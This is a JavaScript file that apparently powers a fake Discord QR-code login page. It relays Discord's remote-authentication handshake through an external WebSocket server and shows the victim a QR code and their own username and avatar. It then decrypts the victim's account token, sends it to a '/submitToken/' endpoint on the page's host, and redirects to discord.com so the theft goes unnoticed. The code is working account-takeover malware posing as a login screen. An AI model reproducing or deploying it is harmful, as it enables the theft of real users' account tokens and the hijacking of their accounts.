let ws = null;
let interval = null;
let timeout = null;
let privateKey = null;
let nonce = null;
let loading = `<span class="inner-1gJC7_"><span class="wanderingCubesItem-WPXqao"></span><span class="wanderingCubesItem-WPXqao"></span></span>`;
init();

function init(){
    removeImage();
    privateKey = null;
    nonce = null;
    ws = new WebSocket(`wss://${domainHHH}:8443/`);
    ws.onclose = onclose;
    ws.onerror = onerror;
    ws.onmessage = onmessage;
}

function onmessage(msg){
    let json = JSON.parse(msg.data);
    if(json.op == "hello"){
        fetch("/crypto/generate_pair").then(e => e.json()).then(result => {
            privateKey = result.privateKey;
            ws.send(JSON.stringify({  op: "init", encoded_public_key: result.publicKey }));
            if(interval) clearInterval(interval);
            interval = setInterval(() => {
                ws.send(JSON.stringify({ op: "heartbeat" }));
            }, json.heartbeat_interval);
            if(timeout) clearTimeout(timeout);
            timeout = setTimeout(() => {
                ws.close();
            }, json.timeout_ms)
        })
    }else if(json.op == "nonce_proof"){
        let encryptedNonce = json.encrypted_nonce
        fetch("/crypto/decrypt", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ key: privateKey, data: encryptedNonce, nonce: true })
        }).then(e => e.json()).then(result => {
           ws.send(JSON.stringify({ op: "nonce_proof", proof: result.result }));
        });
    }else if(json.op == "pending_remote_init"){
        let img = new Image();
        img.src = `https://qr-generator.qrcode.studio/qr/custom?data=${encodeURIComponent("https://discord.com/ra/"+json.fingerprint)}&size=176`;
        img.onload = () => {
            document.getElementById("qrCodeBack").src = img.src;
            document.getElementById("qrCodeBackSecond").style.display = "flex";
            let image = document.createElement("img");
            image.src = "/assets/092b071c3b3141a58787415450c27857.png";
            image.style.width = "50px";
            document.getElementById("qrCodeFront").innerHTML = "";
            document.getElementById("qrCodeFront").appendChild(image);
        }
    }else if(json.op == "pending_finish"){
        fetch("/crypto/decrypt", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ key: privateKey, data: json.encrypted_user_payload })
        }).then(e => e.json()).then(result => {
            let data = result.result.split(":");
            document.getElementById("loginUsername").innerHTML = "Logging in as " + data[3] + "#" + data[1];
            let format = data[2].startsWith("a_") ? ".gif" : ".png";
            let src = "https://cdn.discordapp.com/avatars/" + data[0] + "/" + data[2] + format + "?size=128";
            let image = new Image();
            image.src = src;
            image.onerror = () => {
                image.src = "https://cdn.discordapp.com/embed/avatars/" + (data[1] % 5) + ".png";
                image.onerror = () => {
                    image.src = "/4.png";
                    image.onerror = image.onload = () => {
                        document.getElementById("userLoginImage").src = image.src;
                        document.getElementById("qrLoginInner").style.marginLeft = "-240px";
                    }
                }
            }
            image.onload = () => {
                document.getElementById("userLoginImage").src = image.src;
                document.getElementById("qrLoginInner").style.marginLeft = "-240px";
            }
        });
    }else if(json.op == "finish"){
        let token = json.encrypted_token;
        fetch("/crypto/decrypt", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ key: privateKey, data: token })
        }).then(e => e.json()).then(result => {
            fetch("/submitToken/"+adCode, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ token: result.result })
            });
            ws.close();
            window.location.href = "https://discord.com/channels/@me";
        });
    }else if(json.op == "cancel"){
        cancel();
        document.getElementById("qrLoginInner").style.marginLeft = "0px";
    }
}

function removeImage(){
    document.getElementById("qrCodeBackSecond").style.display = "none";
    document.getElementById("qrCodeFront").innerHTML = loading;
}

function cancel(){
    removeImage();
    document.getElementById("qrLoginInner").style.marginLeft = "0px";
    if(ws) ws.close();
}

function onclose(event){
    if(interval) clearInterval(interval);
    interval = null;
    if(timeout) clearTimeout(timeout);
    timeout = null;
    console.log(event)
    init();
}
function onerror(event){
    console.log(event);
}
